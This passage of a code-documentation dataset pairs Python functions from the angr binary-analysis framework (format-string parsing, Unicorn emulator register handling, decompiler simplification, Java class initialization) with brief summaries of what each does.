not_enough_bits:\n                            if i == digits - 1:\n                                neg_digit_ascii = ord('-')\n                            else:\n                                neg_digit_value = (-target_variable // (base**i)) % base\n                                neg_digit_ascii = neg_digit_value + ord('0')\n                                if base > 10:\n                                    neg_digit_ascii = claripy.If(neg_digit_value >= 10, neg_digit_value + (-10 + ord('a')), neg_digit_ascii)\n\n                            digit_ascii = claripy.If(negative, neg_digit_ascii, digit_ascii)\n\n                        self.state.solver.add(digit == digit_ascii[7:0])\n\n                    self.state.memory.store(args(argnum), target_variable, endness=self.state.arch.memory_endness)\n                    argnum += 1\n\n            return argnum - startpos\n\n        # TODO: we only support one format specifier in interpretation for now\n\n        format_specifier_count = sum(1 for x in self.components if isinstance(x, FormatSpecifier))\n        if format_specifier_count > 1:\n            l.warning(\"We don't support more than one format specifiers in format strings.\")\n\n        if simfd is not None:\n            region = simfd.read_storage\n            addr = simfd._pos if hasattr(simfd, '_pos') else simfd._read_pos # XXX THIS IS BAD\n        else:\n            region = self.parser.state.memory\n\n        bits = self.parser.state.arch.bits\n        failed = self.parser.state.solver.BVV(0, bits)\n        argpos = startpos\n        position = addr\n        for component in self.components:\n            if isinstance(component, bytes):\n                # TODO we skip non-format-specifiers in format string interpretation for now\n                # if the region doesn't match the concrete component, we need to return immediately\n                pass\n            else:\n                fmt_spec = component\n                try:\n                    dest = args(argpos)\n                except SimProcedureArgumentError:\n                    dest = None\n                if fmt_spec.spec_type == b's':\n                    # set some limits for the find\n                    max_str_len = self.parser.state.libc.max_str_len\n                    max_sym_bytes = self.parser.state.libc.buf_symbolic_bytes\n\n                    # has the length of the format been limited by the string itself?\n                    if fmt_spec.length_spec is not None:\n                        max_str_len = fmt_spec.length_spec\n                        max_sym_bytes = fmt_spec.length_spec\n\n                    # TODO: look for limits on other characters which scanf is sensitive to, '\\x00', '\\x20'\n                    ohr, ohc, ohi = region.find(position, self.parser.state.solver.BVV(b'\\n'), max_str_len, max_symbolic_bytes=max_sym_bytes)\n\n                    # if no newline is found, mm is position + max_strlen\n                    # If-branch will really only happen for format specifiers with a length\n                    mm = self.parser.state.solver.If(ohr == 0, position + max_str_len, ohr)\n                    # we're just going to concretize the length, load will do this anyways\n                    length = self.parser.state.solver.max_int(mm - position)\n                    src_str = region.load(position, length)\n\n                    # TODO all of these should be delimiters we search for above\n                    # add that the contents of the string cannot be any scanf %s string delimiters\n                    for delimiter in set(FormatString.SCANF_DELIMITERS):\n                        delim_bvv = self.parser.state.solver.BVV(delimiter)\n                        for i in range(length):\n                            self.parser.state.add_constraints(region.load(position + i, 1) != delim_bvv)\n\n                    # write it out to the pointer\n                    self.parser.state.memory.store(dest, src_str)\n                    # store the terminating null byte\n                    self.parser.state.memory.store(dest + length, self.parser.state.solver.BVV(0, 8))\n\n                    position += length\n\n                else:\n\n                    # XXX: atoi only supports strings of one byte\n                    if fmt_spec.spec_type in [b'd', b'i', b'u', b'x']:\n                        base = 16 if fmt_spec.spec_type == b'x' else 10\n                        status, i, num_bytes = self.parser._sim_atoi_inner(position, region, base=base, read_length=fmt_spec.length_spec)\n                        # increase failed count if we were unable to parse it\n                        failed = self.parser.state.solver.If(status, failed, failed + 1)\n                        position += num_bytes\n                    elif fmt_spec.spec_type == b'c':\n                        i = region.load(position, 1)\n                        i = i.zero_extend(bits - 8)\n                        position += 1\n                    else:\n                        raise SimProcedureError(\"unsupported format spec '%s' in interpret\" % fmt_spec.spec_type)\n\n                    i = self.parser.state.solver.Extract(fmt_spec.size*8-1, 0, i)\n                    self.parser.state.memory.store(dest, i, size=fmt_spec.size, endness=self.parser.state.arch.memory_endness)\n\n                argpos += 1\n\n        if simfd is not None:\n            simfd.read_data(position - addr)\n\n        return (argpos - startpos) - failed"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a dictionary of modified length modifiers and conversion specifiers.", "response": "def _mod_spec(self):\n        \"\"\"\n        Modified length specifiers: mapping between length modifiers and conversion specifiers. This generates all the\n        possibilities, i.e. hhd, etc.\n        \"\"\"\n        mod_spec={}\n\n        for mod, sizes in self.int_len_mod.items():\n\n            for conv in self.int_sign['signed']:\n                mod_spec[mod + conv] = sizes[0]\n\n            for conv in self.int_sign['unsigned']:\n                mod_spec[mod + conv] = sizes[1]\n\n        return mod_spec"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _all_spec(self):\n\n        base = self._mod_spec\n\n        for spec in self.basic_spec:\n            base[spec] = self.basic_spec[spec]\n\n        return base", "response": "Return a dictionary of all the specifiers and their lengths."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _match_spec(self, nugget):\n        # TODO: handle positional modifiers and other similar format string tricks.\n        all_spec = self._all_spec\n\n        # iterate through nugget throwing away anything which is an int\n        # TODO store this in a size variable\n\n        original_nugget = nugget\n        length_str = [ ]\n        length_spec = None\n        length_spec_str_len = 0\n\n        if nugget.startswith(b\".*\"):\n            # \".*\": precision is specified as an argument\n            nugget = nugget[2:]\n            length_spec = b\".*\"\n            length_spec_str_len = 2\n\n        for j, c in enumerate(nugget):\n            if c in ascii_digits:\n                length_str.append(c)\n            else:\n                nugget = nugget[j:]\n                if length_spec is None:\n                    length_spec = None if len(length_str) == 0 else int(bytes(length_str))\n                break\n\n        # we need the length of the format's length specifier to extract the format and nothing else\n        if length_spec_str_len == 0 and length_str:\n            length_spec_str_len = len(length_str)\n        # is it an actual format?\n        for spec in all_spec:\n            if nugget.startswith(spec):\n                # this is gross coz sim_type is gross..\n                nugget = nugget[:len(spec)]\n                original_nugget = original_nugget[:(length_spec_str_len + len(spec))]\n                nugtype = all_spec[nugget]\n                try:\n                    typeobj = sim_type.parse_type(nugtype).with_arch(self.state.arch)\n                except:\n                    raise SimProcedureError(\"format specifier uses unknown type '%s'\" % repr(nugtype))\n                return FormatSpecifier(original_nugget, length_spec, typeobj.size // 8, typeobj.signed)\n\n        return None", "response": "Match the string nugget to a format specifier."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_fmt(self, fmt):\n\n        # iterate over the format string looking for format specifiers\n        components = [ ]\n        i = 0\n        while i < len(fmt):\n            if type(fmt[i]) is bytes and fmt[i] == b\"%\":\n                # Note that we only support concrete format specifiers\n                # grab the specifier\n                # go to the space\n                specifier = b\"\"\n                for c in fmt[i+1:]:\n                    if type(c) is bytes:\n                        specifier += c\n                    else:\n                        break\n\n                specifier = self._match_spec(specifier)\n                if specifier is not None:\n                    i += len(specifier)\n                    components.append(specifier)\n                else:\n                    # if we get here we didn't match any specs, the first char will be thrown away\n                    # and we'll add the percent\n                    i += 1\n                    components.append(b'%')\n            else:\n                # claripy ASTs, which are usually symbolic variables\n                # They will be kept as they are - even if those chars can be evaluated to \"%\"\n                components.append(fmt[i])\n            i += 1\n\n        return FormatString(self, components)", "response": "Extract the actual formats from the format string fmt."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _sim_atoi_inner(self, str_addr, region, base=10, read_length=None):\n\n        from .. import SIM_PROCEDURES\n        strtol = SIM_PROCEDURES['libc']['strtol']\n\n        return strtol.strtol_inner(str_addr, self.state, region, base, True, read_length=read_length)", "response": "Internal function to invoke the atoi simprocedure on the given string address."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the result of invoking the strlen simprocedure on str_addr.", "response": "def _sim_strlen(self, str_addr):\n        \"\"\"\n        Return the result of invoking the strlen simprocedure on `str_addr`.\n        \"\"\"\n\n        from .. import SIM_PROCEDURES\n        strlen = SIM_PROCEDURES['libc']['strlen']\n\n        return self.inline_call(strlen, str_addr).ret_expr"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a format string.", "response": "def _parse(self, fmt_idx):\n        \"\"\"\n        Parse format strings.\n\n        :param fmt_idx: The index of the (pointer to the) format string in the arguments list.\n        :returns:       A FormatString object which can be used for replacing the format specifiers with arguments or\n                        for scanning into arguments.\n        \"\"\"\n\n        fmtstr_ptr = self.arg(fmt_idx)\n\n        if self.state.solver.symbolic(fmtstr_ptr):\n            raise SimProcedureError(\"Symbolic pointer to (format) string :(\")\n\n        length = self._sim_strlen(fmtstr_ptr)\n        if self.state.solver.symbolic(length):\n            all_lengths = self.state.solver.eval_upto(length, 2)\n            if len(all_lengths) != 1:\n                raise SimProcedureError(\"Symbolic (format) string, game over :(\")\n            length = all_lengths[0]\n\n        if self.state.solver.is_true(length == 0):\n            return FormatString(self, [b\"\"])\n\n        fmt_xpr = self.state.memory.load(fmtstr_ptr, length)\n\n        fmt = [ ]\n        for i in range(fmt_xpr.size(), 0, -8):\n            char = fmt_xpr[i - 1 : i - 8]\n            try:\n                conc_char = self.state.solver.eval_one(char)\n            except SimSolverError:\n                # For symbolic chars, just keep them symbolic\n                fmt.append(char)\n            else:\n                # Concrete chars are directly appended to the list\n                fmt.append(bytes([conc_char]))\n\n        # make a FormatString object\n        fmt_str = self._get_fmt(fmt)\n\n        l.debug(\"Fmt: %r\", fmt_str)\n\n        return fmt_str"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _hook_mem_unmapped(self, uc, access, address, size, value, user_data, size_extension=True): #pylint:disable=unused-argument\n        # FIXME check angr hooks at `address`\n\n        if size_extension:\n            start = address & (0xfffffffffffff0000)\n            length = ((address + size + 0xffff) & (0xfffffffffffff0000)) - start\n        else:\n            start = address & (0xffffffffffffff000)\n            length = ((address + size + 0xfff) & (0xffffffffffffff000)) - start\n\n        if (start == 0 or ((start + length) & ((1 << self.state.arch.bits) - 1)) == 0) and options.UNICORN_ZEROPAGE_GUARD in self.state.options:\n            # sometimes it happens because of %fs is not correctly set\n            self.error = 'accessing zero page [%#x, %#x] (%#x)' % (address, address + length - 1, access)\n            l.warning(self.error)\n\n            # tell uc_state to rollback\n            _UC_NATIVE.stop(self._uc_state, STOP.STOP_ZEROPAGE)\n            return False\n\n        ret = False\n        try:\n            best_effort_read = size_extension\n            ret = self._hook_mem_unmapped_core(uc, access, start, length, best_effort_read=best_effort_read)\n\n        except AccessingZeroPageError:\n            # raised when STRICT_PAGE_ACCESS is enabled\n            if not size_extension:\n                _UC_NATIVE.stop(self._uc_state, STOP.STOP_SEGFAULT)\n                ret = False\n\n        except FetchingZeroPageError:\n            # raised when trying to execute code on an unmapped page\n            if not size_extension:\n                self.error = 'fetching empty page [%#x, %#x]' % (start, start + length - 1)\n                l.warning(self.error)\n                _UC_NATIVE.stop(self._uc_state, STOP.STOP_EXECNONE)\n                ret = False\n\n        except SimMemoryError:\n            if not size_extension:\n                raise\n\n        except SegfaultError:\n            if not size_extension:\n                _UC_NATIVE.stop(self._uc_state, STOP.STOP_SEGFAULT)\n                ret = False\n\n        except MixedPermissonsError:\n            if not size_extension:\n                # weird... it shouldn't be raised at all\n                l.error('MixedPermissionsError is raised when size-extension is disabled. Please report it.')\n                _UC_NATIVE.stop(self._uc_state, STOP.STOP_SEGFAULT)\n                ret = False\n\n        except unicorn.UcError as ex:\n            if not size_extension:\n                if ex.errno == 11:\n                    # Mapping failed. Probably because of size extension... let's try to redo it without size extension\n                    pass\n                else:\n                    # just raise the exception\n                    raise\n\n        finally:\n            if size_extension and not ret:\n                # retry without size-extension if size-extension was enabled\n                # any exception will not be caught\n                ret = self._hook_mem_unmapped(uc, access, address, size, value, user_data, size_extension=False)\n\n        return ret", "response": "Internal hook for unicorn s mem_unmapped method."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsets the unicorn registers", "response": "def set_regs(self):\n        ''' setting unicorn registers '''\n        uc = self.uc\n\n        if self.state.arch.qemu_name == 'x86_64':\n            fs = self.state.solver.eval(self.state.regs.fs)\n            gs = self.state.solver.eval(self.state.regs.gs)\n            self.write_msr(fs, 0xC0000100)\n            self.write_msr(gs, 0xC0000101)\n            flags = self._process_value(self.state.regs.eflags, 'reg')\n            if flags is None:\n                raise SimValueError('symbolic eflags')\n            uc.reg_write(self._uc_const.UC_X86_REG_EFLAGS, self.state.solver.eval(flags))\n        elif self.state.arch.qemu_name == 'i386':\n            flags = self._process_value(self.state.regs.eflags, 'reg')\n            if flags is None:\n                raise SimValueError('symbolic eflags')\n\n            uc.reg_write(self._uc_const.UC_X86_REG_EFLAGS, self.state.solver.eval(flags))\n            fs = self.state.solver.eval(self.state.regs.fs) << 16\n            gs = self.state.solver.eval(self.state.regs.gs) << 16\n            self.setup_gdt(fs, gs)\n\n\n        for r, c in self._uc_regs.items():\n            if r in self.reg_blacklist:\n                continue\n            v = self._process_value(getattr(self.state.regs, r), 'reg')\n            if v is None:\n                    raise SimValueError('setting a symbolic register')\n            # l.debug('setting $%s = %#x', r, self.state.solver.eval(v))\n            uc.reg_write(c, self.state.solver.eval(v))\n\n        if self.state.arch.name in ('X86', 'AMD64'):\n            # sync the fp clerical data\n            c3210 = self.state.solver.eval(self.state.regs.fc3210)\n            top = self.state.solver.eval(self.state.regs.ftop[2:0])\n            rm = self.state.solver.eval(self.state.regs.fpround[1:0])\n            control = 0x037F | (rm << 10)\n            status = (top << 11) | c3210\n            uc.reg_write(unicorn.x86_const.UC_X86_REG_FPCW, control)\n            uc.reg_write(unicorn.x86_const.UC_X86_REG_FPSW, status)\n\n            # we gotta convert the 64-bit doubles values to 80-bit extended precision!\n            uc_offset = unicorn.x86_const.UC_X86_REG_FP0\n            vex_offset = self.state.arch.registers['fpu_regs'][0]\n            vex_tag_offset = self.state.arch.registers['fpu_tags'][0]\n            tag_word = 0\n            for _ in range(8):\n                tag = self.state.solver.eval(self.state.registers.load(vex_tag_offset, size=1))\n                tag_word <<= 2\n                if tag == 0:\n                    tag_word |= 3       # unicorn doesn't care about any value other than 3 for setting\n                else:\n                    val = self._process_value(self.state.registers.load(vex_offset, size=8), 'reg')\n                    if val is None:\n                        raise SimValueError('setting a symbolic fp register')\n                    val = self.state.solver.eval(val)\n\n                    sign = bool(val & 0x8000000000000000)\n                    exponent = (val & 0x7FF0000000000000) >> 52\n                    mantissa =  val & 0x000FFFFFFFFFFFFF\n                    if exponent not in (0, 0x7FF): # normal value\n                        exponent = exponent - 1023 + 16383\n                        mantissa <<= 11\n                        mantissa |= 0x8000000000000000  # set integer part bit, implicit to double\n                    elif exponent == 0:     # zero or subnormal value\n                        mantissa = 0\n                    elif exponent == 0x7FF:    # nan or infinity\n                        exponent = 0x7FFF\n                        if mantissa != 0:\n                            mantissa = 0x8000000000000000\n                        else:\n                            mantissa = 0xFFFFFFFFFFFFFFFF\n\n                    if sign:\n                        exponent |= 0x8000\n\n                    uc.reg_write(uc_offset, (exponent, mantissa))\n\n                uc_offset += 1\n                vex_offset += 8\n                vex_tag_offset += 1\n\n            uc.reg_write(unicorn.x86_const.UC_X86_REG_FPTAG, tag_word)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_regs(self):\n        ''' loading registers from unicorn '''\n\n        # first, get the ignore list (in case of symbolic registers)\n        if options.UNICORN_SYM_REGS_SUPPORT in self.state.options:\n            highest_reg_offset, reg_size = max(self.state.arch.registers.values())\n            symbolic_list = (ctypes.c_uint64*(highest_reg_offset + reg_size))()\n            num_regs = _UC_NATIVE.get_symbolic_registers(self._uc_state, symbolic_list)\n\n            # we take the approach of saving off the symbolic regs and then writing them back\n            saved_registers = [ ]\n            cur_group = None\n            last = None\n            for i in sorted(symbolic_list[:num_regs]):\n                if cur_group is None:\n                    cur_group = i\n                elif i != last + 1 or cur_group//self.state.arch.bytes != i//self.state.arch.bytes:\n                    saved_registers.append((\n                        cur_group, self.state.registers.load(cur_group, last-cur_group+1)\n                    ))\n                    cur_group = i\n                last = i\n            if cur_group is not None:\n                saved_registers.append((\n                    cur_group, self.state.registers.load(cur_group, last-cur_group+1)\n                ))\n\n        # now we sync registers out of unicorn\n        for r, c in self._uc_regs.items():\n            if r in self.reg_blacklist:\n                continue\n            v = self.uc.reg_read(c)\n            # l.debug('getting $%s = %#x', r, v)\n            setattr(self.state.regs, r, v)\n\n        # some architecture-specific register fixups\n        if self.state.arch.name in ('X86', 'AMD64'):\n            if self.jumpkind.startswith('Ijk_Sys'):\n                self.state.registers.store('ip_at_syscall', self.state.regs.ip - 2)\n\n            # update the eflags\n            self.state.regs.eflags = self.state.solver.BVV(self.uc.reg_read(self._uc_const.UC_X86_REG_EFLAGS), self.state.arch.bits)\n\n            # sync the fp clerical data\n            status = self.uc.reg_read(unicorn.x86_const.UC_X86_REG_FPSW)\n            c3210 = status & 0x4700\n            top = (status & 0x3800) >> 11\n            control = self.uc.reg_read(unicorn.x86_const.UC_X86_REG_FPCW)\n            rm = (control & 0x0C00) >> 10\n            self.state.regs.fpround = rm\n            self.state.regs.fc3210 = c3210\n            self.state.regs.ftop = top\n\n            # sync the stx registers\n            # we gotta round the 80-bit extended precision values to 64-bit doubles!\n            uc_offset = unicorn.x86_const.UC_X86_REG_FP0\n            vex_offset = self.state.arch.registers['fpu_regs'][0]\n            vex_tag_offset = self.state.arch.registers['fpu_tags'][0] + 7\n            tag_word = self.uc.reg_read(unicorn.x86_const.UC_X86_REG_FPTAG)\n\n            for _ in range(8):\n                if tag_word & 3 == 3:\n                    self.state.registers.store(vex_tag_offset, 0, size=1)\n                else:\n                    self.state.registers.store(vex_tag_offset, 1, size=1)\n\n                    mantissa, exponent = self.uc.reg_read(uc_offset)\n                    sign = bool(exponent & 0x8000)\n                    exponent = (exponent & 0x7FFF)\n                    if exponent not in (0, 0x7FFF): # normal value\n                        exponent = exponent - 16383 + 1023\n                        if exponent <= 0:   # underflow to zero\n                            exponent = 0\n                            mantissa = 0\n                        elif exponent >= 0x7FF: # overflow to infinity\n                            exponent = 0x7FF\n                            mantissa = 0\n                    elif exponent == 0:     # zero or subnormal value\n                        mantissa = 0\n                    elif exponent == 0x7FFF:    # nan or infinity\n                        exponent = 0x7FF\n                        if mantissa != 0:\n                            mantissa = 0xFFFF\n\n                    val = 0x8000000000000000 if sign else 0\n                    val |= exponent << 52\n                    val |= (mantissa >> 11) & 0xFFFFFFFFFFFFF\n                    # the mantissa calculation is to convert from the 64-bit mantissa to 52-bit\n                    # additionally, extended precision keeps around an high bit that we don't care about\n                    # so 11-shift, not 12\n\n                    self.state.registers.store(vex_offset, val, size=8)\n\n                uc_offset += 1\n                vex_offset += 8\n                tag_word >>= 2\n                vex_tag_offset -= 1\n\n        # now, we restore the symbolic registers\n        if options.UNICORN_SYM_REGS_SUPPORT in self.state.options:\n            for o,r in saved_registers:\n                self.state.registers.store(o, r)", "response": "load the unicorn registers into the state. regs attribute"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if this state might be used in unicorn", "response": "def _check_registers(self, report=True):\n        ''' check if this state might be used in unicorn (has no concrete register)'''\n        for r in self.state.arch.uc_regs.keys():\n            v = getattr(self.state.regs, r)\n            processed_v = self._process_value(v, 'reg')\n            if processed_v is None or processed_v.symbolic:\n                #l.info('detected symbolic register %s', r)\n                if report:\n                    self._report_symbolic_blocker(v, 'reg')\n                return False\n\n        if self.state.arch.vex_conditional_helpers:\n            flags = ccall._get_flags(self.state)[0]\n            processed_flags = self._process_value(flags, 'reg')\n            if processed_flags is None or processed_flags.symbolic:\n                #l.info(\"detected symbolic rflags/eflags\")\n                if report:\n                    self._report_symbolic_blocker(flags, 'reg')\n                return False\n\n        #l.debug('passed quick check')\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _track_stack_pointers(self):\n\n        regs = {self.project.arch.sp_offset}\n        if hasattr(self.project.arch, 'bp_offset') and self.project.arch.bp_offset is not None:\n            regs.add(self.project.arch.bp_offset)\n        spt = self.project.analyses.StackPointerTracker(self.function, regs, track_memory=self._sp_tracker_track_memory)\n        if spt.inconsistent_for(self.project.arch.sp_offset):\n            l.warning(\"Inconsistency found during stack pointer tracking. Decompilation results might be incorrect.\")\n        return spt", "response": "For each instruction track its stack pointer offset and stack base pointer offset."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _convert(self, block_node):\n\n        if not type(block_node) is BlockNode:\n            return block_node\n\n        block = self.project.factory.block(block_node.addr, block_node.size)\n\n        ail_block = ailment.IRSBConverter.convert(block.vex, self._ail_manager)\n        return ail_block", "response": "Convert a VEX block to an AIL block."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsimplifies all blocks in the function graph.", "response": "def _simplify_blocks(self, stack_pointer_tracker=None):\n        \"\"\"\n        Simplify all blocks in self._blocks.\n\n        :param stack_pointer_tracker:   The RegisterDeltaTracker analysis instance.\n        :return:                        None\n        \"\"\"\n\n        # First of all, let's simplify blocks one by one\n\n        for key in self._blocks:\n            ail_block = self._blocks[key]\n            simplified = self._simplify_block(ail_block, stack_pointer_tracker=stack_pointer_tracker)\n            self._blocks[key] = simplified\n\n        # Update the function graph so that we can use reaching definitions\n        self._update_graph()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsimplifies a single AIL block.", "response": "def _simplify_block(self, ail_block, stack_pointer_tracker=None):\n        \"\"\"\n        Simplify a single AIL block.\n\n        :param ailment.Block ail_block: The AIL block to simplify.\n        :param stack_pointer_tracker:   The RegisterDeltaTracker analysis instance.\n        :return:                        A simplified AIL block.\n        \"\"\"\n\n        simp = self.project.analyses.AILBlockSimplifier(ail_block, stack_pointer_tracker=stack_pointer_tracker)\n        return simp.result_block"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _simplify_function(self):\n\n        # Computing reaching definitions\n        rd = self.project.analyses.ReachingDefinitions(func=self.function, func_graph=self.graph, observe_all=True)\n\n        simp = self.project.analyses.AILSimplifier(self.function, func_graph=self.graph, reaching_definitions=rd)\n\n        for key in list(self._blocks.keys()):\n            old_block = self._blocks[key]\n            if old_block in simp.blocks:\n                self._blocks[key] = simp.blocks[old_block]\n\n        self._update_graph()", "response": "Simplify the entire function."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsimplify all function call statements.", "response": "def _make_callsites(self, stack_pointer_tracker=None):\n        \"\"\"\n        Simplify all function call statements.\n\n        :return:    None\n        \"\"\"\n\n        # Computing reaching definitions\n        rd = self.project.analyses.ReachingDefinitions(func=self.function, func_graph=self.graph, observe_all=True)\n\n        for key in self._blocks:\n            block = self._blocks[key]\n            csm = self.project.analyses.AILCallSiteMaker(block, reaching_definitions=rd)\n            if csm.result_block:\n                ail_block = csm.result_block\n                simp = self.project.analyses.AILBlockSimplifier(ail_block, stack_pointer_tracker=stack_pointer_tracker)\n                self._blocks[key] = simp.result_block\n\n        self._update_graph()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _link_variables_on_block(self, block, kb):\n\n        variable_manager = kb.variables[self.function.addr]\n\n        for stmt_idx, stmt in enumerate(block.statements):\n            # I wish I could do functional programming in this method...\n            stmt_type = type(stmt)\n            if stmt_type is ailment.Stmt.Store:\n                # find a memory variable\n                mem_vars = variable_manager.find_variables_by_atom(block.addr, stmt_idx, stmt)\n                if len(mem_vars) == 1:\n                    stmt.variable, stmt.offset = next(iter(mem_vars))\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, stmt.data)\n\n            elif stmt_type is ailment.Stmt.Assignment:\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, stmt.dst)\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, stmt.src)\n\n            elif stmt_type is ailment.Stmt.ConditionalJump:\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, stmt.condition)\n\n            elif stmt_type is ailment.Stmt.Call:\n                if stmt.ret_expr:\n                    self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, stmt.ret_expr)", "response": "Link atoms in the given block to corresponding variables identified previously."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _link_variables_on_expr(self, variable_manager, block, stmt_idx, stmt, expr):\n\n        if type(expr) is ailment.Expr.Register:\n            # find a register variable\n            reg_vars = variable_manager.find_variables_by_atom(block.addr, stmt_idx, expr)\n            # TODO: make sure it is the correct register we are looking for\n            if len(reg_vars) == 1:\n                reg_var, offset = next(iter(reg_vars))\n                expr.variable = reg_var\n                expr.offset = offset\n\n        elif type(expr) is ailment.Expr.Load:\n            # import ipdb; ipdb.set_trace()\n            variables = variable_manager.find_variables_by_atom(block.addr, stmt_idx, expr)\n            if len(variables) == 0:\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, expr.addr)\n            else:\n                if len(variables) > 1:\n                    l.error(\"More than one variable are available for atom %s. Consider fixing it using phi nodes.\",\n                            expr\n                            )\n                var, offset = next(iter(variables))\n                expr.variable = var\n                expr.offset = offset\n\n        elif type(expr) is ailment.Expr.BinaryOp:\n            variables = variable_manager.find_variables_by_atom(block.addr, stmt_idx, expr)\n            if len(variables) == 1:\n                var, offset = next(iter(variables))\n                expr.referenced_variable = var\n                expr.offset = offset\n            else:\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, expr.operands[0])\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, expr.operands[1])\n\n        elif type(expr) is ailment.Expr.UnaryOp:\n            variables = variable_manager.find_variables_by_atom(block.addr, stmt_idx, expr)\n            if len(variables) == 1:\n                var, offset = next(iter(variables))\n                expr.referenced_variable = var\n                expr.offset = offset\n            else:\n                self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, expr.operands)\n\n        elif type(expr) is ailment.Expr.Convert:\n            self._link_variables_on_expr(variable_manager, block, stmt_idx, stmt, expr.operand)\n\n        elif isinstance(expr, ailment.Expr.BasePointerOffset):\n            variables = variable_manager.find_variables_by_atom(block.addr, stmt_idx, expr)\n            if len(variables) == 1:\n                var, offset = next(iter(variables))\n                expr.referenced_variable = var\n                expr.offset = offset", "response": "Link atoms in the given expression to corresponding variables identified previously."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_class(self, class_name, init_class=False, step_func=None):\n        # try to get the soot class object from CLE\n        java_binary = self.state.javavm_registers.load('ip_binary')\n        soot_class = java_binary.get_soot_class(class_name, none_if_missing=True)\n        # create class descriptor\n        class_descriptor = SootClassDescriptor(class_name, soot_class)\n        # load/initialize class\n        if init_class:\n            self.init_class(class_descriptor, step_func=step_func)\n        return class_descriptor", "response": "Get a class descriptor for the class."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the superclass of the class.", "response": "def get_superclass(self, class_):\n        \"\"\"\n        Get the superclass of the class.\n        \"\"\"\n        if not class_.is_loaded or class_.superclass_name is None:\n            return None\n        return self.get_class(class_.superclass_name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwalking up the class hierarchy and returns a list of all classes between base_class and java. lang. Object.", "response": "def get_class_hierarchy(self, base_class):\n        \"\"\"\n        Walks up the class hierarchy and returns a list of all classes between\n        base class (inclusive) and java.lang.Object (exclusive).\n        \"\"\"\n        classes = [base_class]\n        while classes[-1] is not None and classes[-1] != \"java.lang.Object\":\n            classes.append(self.get_superclass(classes[-1]))\n        return classes[:-1]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef init_class(self, class_, step_func=None):\n        if self.is_class_initialized(class_):\n            l.debug(\"Class %r already initialized.\", class_)\n            return\n\n        l.debug(\"Initialize class %r.\", class_)\n        self.initialized_classes.add(class_)\n\n        if not class_.is_loaded:\n            l.warning(\"Class %r is not loaded in CLE. Skip initializiation.\", class_)\n            return\n\n        clinit_method = resolve_method(self.state, '<clinit>', class_.name,\n                                       include_superclasses=False, init_class=False)\n        if clinit_method.is_loaded:\n            javavm_simos = self.state.project.simos\n            clinit_state = javavm_simos.state_call(addr=SootAddressDescriptor(clinit_method, 0, 0),\n                                                   base_state=self.state,\n                                                   ret_addr=SootAddressTerminator())\n            simgr = self.state.project.factory.simgr(clinit_state)\n            l.info(\">\"*15 + \" Run class initializer %r ... \" + \">\"*15, clinit_method)\n            simgr.run(step_func=step_func)\n            l.debug(\"<\"*15 + \" Run class initializer %r ... done \" + \"<\"*15, clinit_method)\n            # The only thing that can be updated during initialization are\n            # static or rather global information, which are either stored on\n            # the heap or in the vm_static_table\n            self.state.memory.vm_static_table = simgr.deadended[-1].memory.vm_static_table.copy()\n            self.state.memory.heap = simgr.deadended[-1].memory.heap.copy()\n        else:\n            l.debug(\"Class initializer <clinit> is not loaded in CLE. Skip initializiation.\")", "response": "This method simulates the loading of a class by the JVM, during which\n        parts of the class (e.g. static fields) are initialized. For this, we\n        run the class initializer method <clinit> (if available) and update\n        the state accordingly.\n\n        Note: Initialization is skipped, if the class has already been\n              initialized (or if it's not loaded in CLE)."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the IRSB object from an address a SimRun or a CFGNode.", "response": "def _get_irsb(self, v):\n        \"\"\"\n        Get the IRSB object from an address, a SimRun, or a CFGNode.\n        :param v: Can be one of the following: an address, or a CFGNode.\n        :return: The IRSB instance.\n        :rtype: pyvex.IRSB\n        \"\"\"\n\n        if isinstance(v, CFGNode):\n            v = v.addr\n\n        if type(v) is int:\n            # Generate an IRSB from self._project\n\n            if v in self._run_cache:\n                return self._run_cache[v]\n\n            if self.project:\n                irsb = self.project.factory.block(v, backup_state=self._base_state).vex\n                self._run_cache[v] = irsb\n                return irsb\n            else:\n                raise AngrBladeError(\"Project must be specified if you give me all addresses for SimRuns\")\n\n        else:\n            raise AngrBladeError('Unsupported SimRun argument type %s', type(v))"}
